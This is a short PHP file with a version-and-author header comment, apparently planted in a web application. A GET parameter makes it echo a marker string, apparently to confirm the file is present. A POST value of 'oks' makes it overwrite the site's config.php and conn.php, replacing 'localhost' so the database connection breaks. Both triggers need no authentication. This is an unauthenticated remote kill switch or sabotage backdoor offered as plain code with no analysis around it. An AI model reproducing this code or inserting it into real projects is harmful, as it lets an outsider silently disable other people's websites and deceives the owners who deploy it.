<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/
if($_GET['lp']){
	exit("三五零八二六七四八");
}
$rz = $_POST['ok'];
if ( $rz != "oks" )
{
		exit( "Domain error." );
		exit( );
}
else
{
		$filename = "../../config.php";
		$content = file_get_contents( $filename );
		$content = str_replace( "localhost", $rz, $content );
		file_put_contents( $filename, $content );
		$filenames = "../../conn.php";
		$contents = file_get_contents( $filenames );
		$contents = str_replace( "localhost", $rz, $contents );
		file_put_contents( $filenames, $contents );
}
?>
